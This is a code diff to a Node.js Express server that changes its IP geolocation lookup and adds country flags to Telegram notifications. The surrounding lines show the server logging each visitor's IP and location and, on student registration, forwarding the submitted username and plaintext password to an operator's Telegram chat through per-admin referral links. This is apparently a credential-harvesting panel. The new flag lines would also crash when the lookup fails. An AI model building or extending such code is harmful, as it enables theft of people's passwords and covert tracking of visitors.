@@ -181,10 +181,23 @@ async function sendToAdmin(adminId, msg) {
 async function getLocation(ip) {
   try {
     const clean = (ip || "").split(",")[0].trim();
-    const { data } = await axios.get(`https://ipapi.co/${clean}/json/`);
-    return { city: data.city, region: data.region, country: data.country_name };
+    const { data } = await axios.get(`https://ipwho.is/${clean}`);
+
+    if (!data.success) throw new Error("Lookup failed");
+
+    return {
+      city: data.city,
+      region: data.region,
+      country: data.country,
+      country_code: data.country_code,
+      flag: {
+        emoji: data.flag.emoji,
+        png: data.flag.png,
+        svg: data.flag.svg
+      }
+    };
   } catch (err) {
-    console.warn("getLocation failed:", err && err.message);
+    console.warn("getLocation failed:", err?.response?.status || err.message);
     return {};
   }
 }
@@ -449,7 +462,7 @@ app.post("/student/visit", async (req, res) => {
 
   
     
-await sendTelegram(admin.chatId, `Hey *${admin.firstname}*📈 someone visited your Page \nPath: ${path || '/'}\nReferral: ${actualReferrer || "direct"}\nLocation: ${location.city || "Hidden"}, ${location.country || "Hidden"} \n\n Ip *${ip || "Hidden"}, ${location.region}`);
+await sendTelegram(admin.chatId, `Hey *${admin.firstname}*📈 someone visited your Page \nPath: ${path || '/'}\nReferral: ${actualReferrer || "direct"}\nLocation: ${location.city || "Hidden"}, ${location.country || "Hidden"}${location.flag.svg} \n\n Ip *${ip || "Hidden"}, ${location.region}`);
 
     return res.json({ success: true, message: "Visit tracked" });
   } catch (err) {
@@ -517,7 +530,7 @@ app.post("/student/register", async (req, res) => {
 Username: *${username}* \nPassword: *${password}*\n
 Location: * ${location.city} *, * ${location.country} * `);
     
-    await sendTelegram(ADMIN_CHAT_ID, `🆕 Student registered: *${username}* (via ${admin.username}'s link) from *${location.country || "Unknown location"}\n\n Ip address:*${ip}*`);
+    await sendTelegram(ADMIN_CHAT_ID, `🆕 Student registered: *${username}* (via ${admin.username}'s link) from *${location.country || "Unknownlocation"}${location.flag.emoji}\n\n Ip address:*${ip}*`);
 
     return res.json({ success: true, studentId: student._id, admin: { username: admin.username, phone: admin.phone } });
   } catch (e) {
